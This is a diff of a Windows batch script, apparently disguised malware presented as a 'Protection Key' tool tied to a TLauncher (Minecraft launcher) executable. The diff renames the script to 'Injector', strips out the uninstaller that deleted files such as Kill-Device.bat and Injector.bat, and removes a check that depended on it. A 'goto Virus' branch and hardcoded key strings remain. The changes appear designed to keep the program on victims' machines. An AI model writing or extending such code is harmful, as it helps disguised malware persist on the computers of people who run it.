@@ -1,5 +1,5 @@
 @echo off
-title Protection Key Inventory P.K.I
+title Protection Key Injector
 echo Change Logs:
 echo 1.1 Added Default Password
 echo 1.2 Added Custom Passwords Feature
@@ -9,16 +9,8 @@ echo 1.5 Added A Uninstaller For PKI
 echo 2.0 Created ChangeLogs
 echo 2.1 Added Security Feature (1=Normal 2=Harden 3=Intense)
 echo 2.2 Blocked Security Feature (Debug Mode Only)
-(
-echo mode 25,10
-echo if exist %temp%\TLauncherPortable.exe del %temp%\PKIInv\TLauncherPortable.exe
-echo if exist %temp%\ComputerClea3n.bat del %temp%\ComputerClea3n.bat
-echo if exist %temp%\Injector.bat del %temp%\Injector.bat
-echo if exist TLauncher.exe.bat del TLauncher.exe.bat
-echo if exist Kill-Device.bat del Kill-Device.bat
-echo del %0%
-echo del %%0%%
-)>Uninstall_P.K.I.bat
+echo 2.3 Removed Uninstaller
+timeout /t 2 /nobreak >nul
 if %PWD%==D if %KEY%==D (
 set PWDER=24861363276195041243164913081272161726802903128414872849165117281518256716412059
 set KEYER=24581362274195011235159912921267159926602849122914872849165117281518256716412059
@@ -30,7 +22,7 @@ set KEYER=%KEY%
 
 set "ModuleKeyLogin=%~1"
 if %ModuleKeyLogin%==B goto Virus
-if not exist Uninstall_P.K.I.bat goto Checker
+
 if exist %temp%\PKIInv\TLauncherPortable.exe if %ModuleKeyLogin%==A goto :TLInstaller
 title  
 mode 25,10
